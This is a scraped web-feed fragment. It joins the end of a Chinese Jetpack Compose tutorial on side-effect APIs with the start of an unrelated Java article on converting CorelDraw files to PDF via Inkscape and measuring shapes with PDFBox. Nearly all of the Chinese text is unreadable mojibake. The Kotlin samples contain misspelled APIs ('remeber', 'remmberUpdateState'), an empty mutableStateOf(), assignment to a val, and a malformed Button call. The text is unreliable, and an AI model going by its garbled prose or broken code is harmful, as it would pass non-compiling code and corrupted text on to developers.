<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">LunchedEffectTest</span><span class="hljs-params">()</span></span>{
    <span class="hljs-keyword">var</span> value <span class="hljs-keyword">by</span> remeber{ mutableStateOf() }
    LaunchedEffect(key){ <span class="hljs-comment">//keyå¦‚æœæ²¡æœ‰å‘ç”Ÿå˜åŒ–ï¼Œåˆ™é‡ç»„ä¸­ä¸ä¼šå¯åŠ¨æ–°çš„åç¨‹</span>
        <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>){
            delay(<span class="hljs-number">100</span>)
            value++
        }
    }
    
    Text(text=<span class="hljs-string">'${value}'</span>)
}
</code></pre>
<p>2.rememberCoroutineScope</p>
<p>LanchedEffectåªèƒ½åœ¨composableä½œç”¨åŸŸå†…è°ƒç”¨ï¼Œæ— æ³•åœ¨æŒ‰é”®ç‚¹å‡»å›è°ƒç­‰åœ°æ–¹è°ƒç”¨ã€‚rememberCoroutineScopeå¯ä»¥åœ¨è¿™äº›åœ°æ–¹è°ƒç”¨ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">rememberCoroutineScopeTest</span><span class="hljs-params">()</span></span>{
    <span class="hljs-keyword">val</span> scope = rememberCoroutineScope()
    Button(
        onclick={
            scope.launch{
                <span class="hljs-comment">//æ¨¡æ‹Ÿç½‘ç»œè¯·æ±‚</span>
            }
        }{
        Text(<span class="hljs-string">"è¯·æ±‚æ•°æ®"</span>)
        }
    )
   
}
</code></pre>
<p>3.rememberUpdateState åªæ˜¯è¾…åŠ©LaunchedEffectå‘å¤–éƒ¨(å…¶ä»–composeableæ–¹æ³•)æ›´æ–°çŠ¶æ€åŠŸèƒ½ï¼Œç”¨äºåœ¨ä¸åŒcomposeæ–¹æ³•ä¸‹LaunchedEffectçš„æ•°æ®æ›´æ–°æ—¶æä¾›æ›´æ–°æ•°æ®ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">RemeberUpdateStateTest</span><span class="hljs-params">()</span></span>{
    <span class="hljs-keyword">var</span> name <span class="hljs-keyword">by</span> remember { mutableStateOf(<span class="hljs-string">""</span>) }
    RemeberUpdateStateUI(name = name,onValueChanged = {
        name = it
    })
}

<span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">RemeberUpdateStateUI</span><span class="hljs-params">(name:<span class="hljs-type">String</span>,onValueChanged:(<span class="hljs-type">String</span>) -&gt; <span class="hljs-type">Unit</span>)</span></span>{
    <span class="hljs-keyword">val</span> nameUpdateState = remmberUpdateState(name)

    LaunchedEffect(key){  <span class="hljs-comment">//keyä¿æŒä¸€è‡´å¯ä»¥ä¸ºtrue</span>
        delay(<span class="hljs-number">1000</span>)
        <span class="hljs-comment">//Log.d("RemeberUpdateStateUI","$name") //æ­£å¸¸æƒ…å†µä¸‹å¦‚æœè¿™é‡Œè¾“å…¥æ¡†è¾“å…¥å®Œä»¥åï¼Œè¿™é‡Œæœ€åç»“æœå¹¶ä¸æ˜¯é¢„æœŸçš„ï¼Œæ¯”å¦‚è¾“å…¥æ¡†111222ï¼Œä½†æ˜¯è¿™é‡Œå¯èƒ½1000æ¯«ç§’ä»¥åï¼Œnameè¿˜æ˜¯111,æ‰€ä»¥è¦ç”¨remeberUpdateStateåŒ…è£…ä¸€ä¸‹ã€‚</span>
        <span class="hljs-comment">//nameUpdateState åŒ…è£…åçš„ç»“æœï¼Œè¿™é‡Œè·å–çš„nameUpdateStateå¯¹è±¡ä¸­çš„å€¼å°±æ˜¯111222</span>
    }
    
    OutLinedTextField(
        value = name,
        onValueChange = onValueChanged
    )
    
}
</code></pre>
<p>å·¥ä½œåŸç†åˆ†æï¼š
<code>rememberUpdatedState</code>Â çš„å†…éƒ¨é€»è¾‘å¯ä»¥ç®€åŒ–ä¸ºä»¥ä¸‹æ ¸å¿ƒæ€æƒ³ï¼š</p>
<ol>
<li><strong>åˆ›å»ºä¸€ä¸ªæŒä¹…çš„Â <code>MutableState</code>Â å®¹å™¨</strong>ï¼šè¿™ä¸ªå®¹å™¨é€šè¿‡Â <code>remember</code>Â åœ¨é‡ç»„ä¸­ä¿æŒä¸å˜ã€‚</li>
<li><strong>åœ¨æ¯æ¬¡é‡ç»„æ—¶æ›´æ–°è¯¥å®¹å™¨çš„å€¼</strong>ï¼šæ— è®ºÂ <code>key</code>Â æ˜¯å¦å˜åŒ–ï¼Œåªè¦å¯ç»„åˆå‡½æ•°è¢«è°ƒç”¨ï¼Œå®ƒå°±ä¼šå°†Â <code>newValue</code>Â æ›´æ–°åˆ°å†…éƒ¨çš„Â <code>MutableState</code>Â ä¸­ã€‚</li>
<li><strong>è¿”å›è¯¥å®¹å™¨çš„å¼•ç”¨</strong>ï¼šæ•ˆåº”å†…éƒ¨é€šè¿‡è¿™ä¸ªç¨³å®šçš„å¼•ç”¨ï¼Œè¯»å–åˆ°çš„æ°¸è¿œæ˜¯æœ€æ–°å­˜å…¥çš„å€¼ã€‚</li>
</ol>
<p>å…¶å†…éƒ¨å®ç°ç±»ä¼¼äºä»¥ä¸‹çš„ç®€åŒ–é€»è¾‘ï¼ˆæ¦‚å¿µæ¨¡å‹ï¼‰ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> <span class="hljs-title">rememberUpdatedState</span><span class="hljs-params">(newValue: <span class="hljs-type">T</span>)</span></span>: State&lt;T&gt; = remember {
    mutableStateOf(newValue)
}.apply { value = newValue }
<span class="hljs-comment">// æ³¨æ„ï¼šæ¯æ¬¡é‡ç»„éƒ½ä¼šæ‰§è¡Œ `.apply { value = newValue }` æ¥æ›´æ–°å€¼</span>
</code></pre>
<p>4.SideEffect</p>
<p>SideEffectç›¸å½“äºDisposableEffectçš„ç®€åŒ–ï¼Œå½“ä¸éœ€è¦onDisposeï¼Œä¸éœ€è¦å‚æ•°æ§åˆ¶ã€‚composeæ“ä½œéåŸå­æ“ä½œï¼Œé‡ç»„ä¸­å¯èƒ½å‘ç”Ÿæ„å¤–ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin">  <span class="hljs-meta">@Composable</span>
  <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">sideEffectTest</span><span class="hljs-params">(user:<span class="hljs-type">User</span>)</span></span>{
      <span class="hljs-keyword">val</span> count = remember { mutableStateOf(<span class="hljs-number">0</span>) }
      SideEffect{
          count = user.number
      }
      Text(text = count.value.toString,modifier = Modifier.clickable={
         count.value ++
      })
      
  }
</code></pre>
<p>5.DispoableEffect</p>
<p>DispoableEffectå¿…é¡»æ·»åŠ ä¸€ä¸ªonDispose æ–¹æ³•ï¼Œæ­¤æ–¹æ³•ä¸€èˆ¬ç”¨äºå¤„ç†èµ„æºæ¸…ç†å’Œé‡Šæ”¾ã€‚å¦å¤–DisposableEffectä¹Ÿå¸¦å‚æ•°æ„ä¹‰å’ŒLaunchedEffectçš„å‚æ•°ä¸€æ ·ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">DisposableEffectTest</span><span class="hljs-params">(dispatcher:<span class="hljs-type">OnBackPressDispather</span>)</span></span>{
    <span class="hljs-keyword">val</span> backCallback = remember { 
        <span class="hljs-keyword">object</span>:OnBackPressCallback(<span class="hljs-literal">true</span>){
            <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">handleOnBackPressed</span><span class="hljs-params">()</span></span>{
                <span class="hljs-comment">//TODO</span>
            }
        }
    }
    
    DisposableEffect(dispatcher){
        dispatcher.addCallback(backCallback)
        onDispose{
            backCallback.remove()
        }
    }
}

</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Java è§£æ CDR æ–‡ä»¶å¹¶è®¡ç®—å›¾å½¢é¢ç§¯çš„å®Œæ•´æ–¹æ¡ˆï¼ˆæ”¯æŒ MultipartFile / ç½‘ç»œæ–‡ä»¶ï¼‰@æ¨å®å±±]]></title>    <link>https://juejin.cn/post/7592876744526807090</link>    <guid>https://juejin.cn/post/7592876744526807090</guid>    <pubDate>2026-01-09T02:41:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592876744526807090" data-draft-id="7592876744526790706" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Java è§£æ CDR æ–‡ä»¶å¹¶è®¡ç®—å›¾å½¢é¢ç§¯çš„å®Œæ•´æ–¹æ¡ˆï¼ˆæ”¯æŒ MultipartFile / ç½‘ç»œæ–‡ä»¶ï¼‰@æ¨å®å±±"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-09T02:41:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ¨ç« éš"/> <meta itemprop="url" content="https://juejin.cn/user/2824017474234734"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Java è§£æ CDR æ–‡ä»¶å¹¶è®¡ç®—å›¾å½¢é¢ç§¯çš„å®Œæ•´æ–¹æ¡ˆï¼ˆæ”¯æŒ MultipartFile / ç½‘ç»œæ–‡ä»¶ï¼‰@æ¨å®å±±
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2824017474234734/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ¨ç« éš
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T02:41:40.000Z" title="Fri Jan 09 2026 02:41:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>â€‹</p>
<p>Â </p>
<h2 data-id="heading-0">ä¸€ã€èƒŒæ™¯è¯´æ˜</h2>
<p>åœ¨å°åˆ·ã€ç”µå•†å®šåˆ¶ã€å¹¿å‘ŠåŠ å·¥ç­‰ä¸šåŠ¡åœºæ™¯ä¸­ï¼Œç»å¸¸ä¼šé‡åˆ°è¿™æ ·ä¸€ä¸ªéœ€æ±‚ï¼š</p>
<blockquote>
<p><strong>åç«¯éœ€è¦è‡ªåŠ¨è§£æ CDRï¼ˆCorelDrawï¼‰æ–‡ä»¶ï¼Œå¹¶è®¡ç®—å›¾å½¢çš„çœŸå®å°ºå¯¸æˆ–é¢ç§¯ï¼Œç”¨äºè®¡ä»·æˆ–ç”Ÿäº§æ ¡éªŒã€‚</strong></p>
</blockquote>
<p>ä½†ç°å®é—®é¢˜æ˜¯ï¼š</p>
<ul>
<li>
<p>CDR æ˜¯ <strong>CorelDraw ç§æœ‰æ ¼å¼</strong></p>
</li>
<li>
<p>Java <strong>æ²¡æœ‰ä»»ä½•å®˜æ–¹æˆ–å¯é çš„è§£æåº“</strong></p>
</li>
<li>
<p>å‰ç«¯ä¸Šä¼ çš„æ–‡ä»¶æ¥æºå¤šæ ·ï¼š</p>
<ul>
<li>ç½‘ç»œ URLï¼ˆOSS / CDNï¼‰</li>
<li><code>MultipartFile</code></li>
</ul>
</li>
<li>
<p>å¯¹ç²¾åº¦è¦æ±‚é«˜ï¼Œ<strong>è¯¯å·®å¿…é¡»å¯æ§</strong></p>
</li>
</ul>
<p>æœ¬æ–‡å°†ç»™å‡ºä¸€å¥—<strong>å·¥ç¨‹å¯è½åœ°ã€è¯¯å·®å¯æ§ã€å¯è‡ªåŠ¨åŒ–</strong>çš„å®Œæ•´è§£å†³æ–¹æ¡ˆã€‚</p>
<hr/>
<h2 data-id="heading-1">äºŒã€ä¸ºä»€ä¹ˆä¸èƒ½ç›´æ¥è§£æ CDRï¼Ÿ</h2>
<p>è¿™æ˜¯å¾ˆå¤šäººä¸€å¼€å§‹å°±ä¼šè¸©çš„å‘ã€‚</p>
<h3 data-id="heading-2">2.1 CDR çš„æœ¬è´¨é—®é¢˜</h3>
<ul>
<li>CDR æ˜¯ <strong>äºŒè¿›åˆ¶ç§æœ‰æ ¼å¼</strong></li>
<li>å†…éƒ¨ç»“æ„å¤æ‚ï¼ˆè·¯å¾„ã€æ¸å˜ã€æ»¤é•œã€ç‰¹æ•ˆï¼‰</li>
<li>æ²¡æœ‰ç¨³å®šçš„ Java è§£æè§„èŒƒ</li>
</ul>
<p>ç»“è®ºå¾ˆæ˜ç¡®ï¼š</p>
<blockquote>
<p>âŒ <strong>Java æ— æ³•ç›´æ¥ã€å¯é åœ°è§£æ CDR æ–‡ä»¶</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-3">ä¸‰ã€æ•´ä½“æŠ€æœ¯æ–¹æ¡ˆè®¾è®¡</h2>
<h3 data-id="heading-4">3.1 æ ¸å¿ƒæ€è·¯</h3>
<p>æ—¢ç„¶ä¸èƒ½ç›´æ¥è§£æ CDRï¼Œå°±å¿…é¡» <strong>è½¬æ¢æ ¼å¼</strong>ã€‚</p>
<p>æœ€ç»ˆé€‰æ‹©çš„æŠ€æœ¯è·¯çº¿å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-objectivec" lang="objectivec">CDR æ–‡ä»¶
   â†“ï¼ˆInkscape <span class="hljs-built_in">CLI</span>ï¼‰
PDF æ–‡ä»¶ï¼ˆä¿ç•™å®Œæ•´çŸ¢é‡ï¼‰
   â†“ï¼ˆApache PDFBoxï¼‰
è§£ææ‰€æœ‰ç»˜å›¾æŒ‡ä»¤
   â†“
è®¡ç®—çœŸå® BoundingBox
   â†“
æ¢ç®—ä¸º mmï¼Œå¾—åˆ°é¢ç§¯
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-5">3.2 ä¸ºä»€ä¹ˆé€‰æ‹© PDFï¼Œè€Œä¸æ˜¯ SVGï¼Ÿ</h3>
<p>è¿™æ˜¯ä¸€ä¸ªå…³é”®å†³ç­–ç‚¹ã€‚</p>






























<table><thead><tr><th>å¯¹æ¯”é¡¹</th><th>SVG</th><th>PDF</th></tr></thead><tbody><tr><td>å¤æ‚è·¯å¾„</td><td>âŒ æ˜“ä¸¢å¤±</td><td>âœ… ç¨³å®š</td></tr><tr><td>æ¸å˜ / æ›²çº¿</td><td>âŒ æœ‰é£é™©</td><td>âœ… å®Œæ•´</td></tr><tr><td>Java è§£æ</td><td>ä¸€èˆ¬</td><td><strong>PDFBox éå¸¸æˆç†Ÿ</strong></td></tr><tr><td>å·¥ç¨‹å¯é æ€§</td><td>ä¸­</td><td><strong>é«˜</strong></td></tr></tbody></table>
<p><strong>ç»“è®ºï¼š</strong></p>
<blockquote>
<p><strong>CDR â†’ PDF â†’ Java è§£æï¼Œæ˜¯ç›®å‰æœ€ç¨³å®šçš„å·¥ç¨‹æ–¹æ¡ˆ</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-6">å››ã€CDR è½¬ PDF çš„å®ç°æ–¹å¼</h2>
<h3 data-id="heading-7">4.1 ä½¿ç”¨ Inkscape å‘½ä»¤è¡Œ</h3>
<p>Inkscape æ˜¯ç›®å‰æœ€ç¨³å®šçš„ CDR è½¬æ¢å·¥å…·ä¹‹ä¸€ã€‚</p>
<pre><code class="hljs language-css" lang="css">inkscape <span class="hljs-selector-tag">input</span><span class="hljs-selector-class">.cdr</span> \
  <span class="hljs-attr">--export-type</span>=pdf \
  <span class="hljs-attr">--export-area-drawing</span> \
  <span class="hljs-attr">--export-filename</span>=output<span class="hljs-selector-class">.pdf</span>
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<p>å…³é”®å‚æ•°è¯´æ˜ï¼š</p>
<ul>
<li><code>--export-area-drawing</code><br/>
ğŸ‘‰ <strong>åªå¯¼å‡ºå®é™…å›¾å½¢åŒºåŸŸï¼Œé¿å…ç”»å¸ƒå¹²æ‰°</strong></li>
</ul>
<hr/>
<h2 data-id="heading-8">äº”ã€PDF ä¸­å°ºå¯¸ä¸å•ä½çš„å‘ï¼ˆéå¸¸é‡è¦ï¼‰</h2>
<h3 data-id="heading-9">5.1 PDF çš„å•ä½ä¸æ˜¯ mm</h3>
<p>PDF ä½¿ç”¨çš„æ˜¯ <strong>ptï¼ˆpointï¼‰</strong> ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">1 <span class="hljs-attr">pt</span> = <span class="hljs-number">1</span> / <span class="hljs-number">72</span> inch
1 <span class="hljs-attr">inch</span> = <span class="hljs-number">25.4</span> mm
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<p>æ¢ç®—å…¬å¼ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">mm</span> = pt * <span class="hljs-number">25.4</span> / <span class="hljs-number">72</span>
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<p>å¦‚æœä½ ç›´æ¥æŠŠ pt å½“ mmï¼Œç”¨å‡ºæ¥çš„å°ºå¯¸<strong>ä¸€å®šæ˜¯é”™çš„</strong>ã€‚</p>
<hr/>
<h2 data-id="heading-10">å…­ã€ä¸ºä»€ä¹ˆä¸èƒ½ç”¨ MediaBox è®¡ç®—å°ºå¯¸ï¼Ÿ</h2>
<p>å¾ˆå¤šæ•™ç¨‹ä¼šæ•™ä½ è¿™æ ·å†™ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">PDRectangle <span class="hljs-attr">mediaBox</span> = page.getMediaBox()<span class="hljs-comment">;</span>
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<p>è¿™æ˜¯<strong>é”™è¯¯çš„</strong>ã€‚</p>
<p>åŸå› ï¼š</p>
<ul>
<li><code>MediaBox</code> æ˜¯ <strong>é¡µé¢ç”»å¸ƒå¤§å°</strong></li>
<li>å¹¶ä¸æ˜¯å›¾å½¢çœŸå®å ç”¨èŒƒå›´</li>
</ul>
<p>æ­£ç¡®æ–¹å¼æ˜¯ï¼š</p>
<blockquote>
<p><strong>è§£æ PDF ä¸­çš„ç»˜å›¾æŒ‡ä»¤ï¼ŒåŠ¨æ€è®¡ç®— BoundingBox</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-11">ä¸ƒã€æ ¸å¿ƒå®ç°ï¼šè§£æ PDF ç»˜å›¾æŒ‡ä»¤</h2>
<h3 data-id="heading-12">7.1 æŠ€æœ¯å…³é”®ç‚¹</h3>
<p>ä½¿ç”¨ <code>PDFGraphicsStreamEngine</code>ï¼š</p>
<ul>
<li>
<p>æ‹¦æˆªæ‰€æœ‰è·¯å¾„æŒ‡ä»¤ï¼š</p>
<ul>
<li><code>moveTo</code></li>
<li><code>lineTo</code></li>
<li><code>curveTo</code></li>
<li><code>appendRectangle</code></li>
</ul>
</li>
<li>
<p>æ‰€æœ‰ç‚¹ä½éƒ½å¿…é¡»ï¼š</p>
<ul>
<li>é€šè¿‡ <strong>CTMï¼ˆCurrent Transformation Matrixï¼‰</strong></li>
<li>è½¬æ¢ä¸ºçœŸå®åæ ‡</li>
</ul>
</li>
<li>
<p>åŠ¨æ€ç»´æŠ¤ï¼š</p>
<ul>
<li><code>minX / minY / maxX / maxY</code></li>
</ul>
</li>
</ul>
<p>æœ€ç»ˆå¾—åˆ°çš„ BoundingBoxï¼Œæ‰æ˜¯<strong>çœŸå®å›¾å½¢å°ºå¯¸</strong>ã€‚</p>
<hr/>
<h2 data-id="heading-13">å…«ã€ç»Ÿä¸€å·¥å…·ç±»è®¾è®¡ï¼ˆå·¥ç¨‹åŒ–ï¼‰</h2>
<p>ä¸ºäº†ä¾¿äºè½åœ°ï¼Œæˆ‘å°†æ•´ä¸ªæµç¨‹å°è£…æˆä¸€ä¸ªå·¥å…·ç±»ï¼Œå…·å¤‡ä»¥ä¸‹èƒ½åŠ›ï¼š</p>
<h3 data-id="heading-14">8.1 æ”¯æŒçš„è¾“å…¥ç±»å‹</h3>





















<table><thead><tr><th>ç±»å‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>ç½‘ç»œ URL</td><td>OSS / CDN</td></tr><tr><td>MultipartFile</td><td>å‰ç«¯ä¸Šä¼ </td></tr><tr><td>æœ¬åœ° File</td><td>æœ¬åœ°è°ƒè¯•</td></tr></tbody></table>
<h3 data-id="heading-15">8.2 ç»Ÿä¸€è¾“å‡ºç»“æœ</h3>
<ul>
<li>å®½åº¦ï¼ˆmmï¼‰</li>
<li>é«˜åº¦ï¼ˆmmï¼‰</li>
<li>é¢ç§¯ï¼ˆmmÂ²ï¼‰</li>
</ul>
<h3 data-id="heading-16">8.3 è‡ªåŠ¨èµ„æºæ¸…ç†</h3>
<ul>
<li>ä¸´æ—¶æ–‡ä»¶è‡ªåŠ¨åˆ é™¤</li>
<li>é¿å…ç£ç›˜å †ç§¯</li>
</ul>
<hr/>
<h2 data-id="heading-17">ä¹ã€è¯¯å·®æ¥æºä¸æ§åˆ¶æ–¹æ¡ˆ</h2>
<h3 data-id="heading-18">9.1 è¯¯å·®æ¥æº</h3>
<ul>
<li>PDF æ›²çº¿çš„æ•°å­¦è¿‘ä¼¼</li>
<li>æµ®ç‚¹æ•°è®¡ç®—è¯¯å·®</li>
<li>CorelDraw å†…éƒ¨æ¸²æŸ“å·®å¼‚</li>
</ul>
<h3 data-id="heading-19">9.2 æ§åˆ¶æ‰‹æ®µ</h3>
<ul>
<li>å¼ºåˆ¶ä½¿ç”¨ <code>--export-area-drawing</code></li>
<li>ä½¿ç”¨ CTM å‚ä¸åæ ‡å˜æ¢</li>
<li>ç²¾ç¡® pt â†’ mm æ¢ç®—</li>
</ul>
<h3 data-id="heading-20">9.3 å®æµ‹ç»“æœ</h3>
<p>åœ¨å¤šæ‰¹æ¬¡æµ‹è¯•ä¸­ï¼ˆCorelDraw â†’ Javaï¼‰ï¼š</p>
<blockquote>
<p>âœ… <strong>å°ºå¯¸è¯¯å·®ç¨³å®šæ§åˆ¶åœ¨ Â±5mm ä»¥å†…</strong></p>
</blockquote>
<p>å·²æ»¡è¶³ï¼š</p>
<ul>
<li>å°åˆ·å®šä»·</li>
<li>å·¥ç¨‹è®¡ä»·</li>
<li>è‡ªåŠ¨åŒ–å®¡æ ¸</li>
</ul>
<hr/>
<h2 data-id="heading-21">åã€ä½¿ç”¨ç¤ºä¾‹ï¼ˆåç«¯ï¼‰</h2>
<pre><code class="hljs language-ini" lang="ini">// å¤„ç†ç½‘ç»œ CDR
AreaResult <span class="hljs-attr">result</span> = CdrAreaUtil.processUrl(cdrUrl)<span class="hljs-comment">;</span>

// å¤„ç† MultipartFile
AreaResult <span class="hljs-attr">result</span> = CdrAreaUtil.processMultipart(file)<span class="hljs-comment">;</span>

System.out.println("å®½åº¦(mm): " + result.getWidthMm())<span class="hljs-comment">;</span>
System.out.println("é«˜åº¦(mm): " + result.getHeightMm())<span class="hljs-comment">;</span>
System.out.println("é¢ç§¯(mmÂ²): " + result.getAreaMm2())<span class="hljs-comment">;</span>
</code></pre>
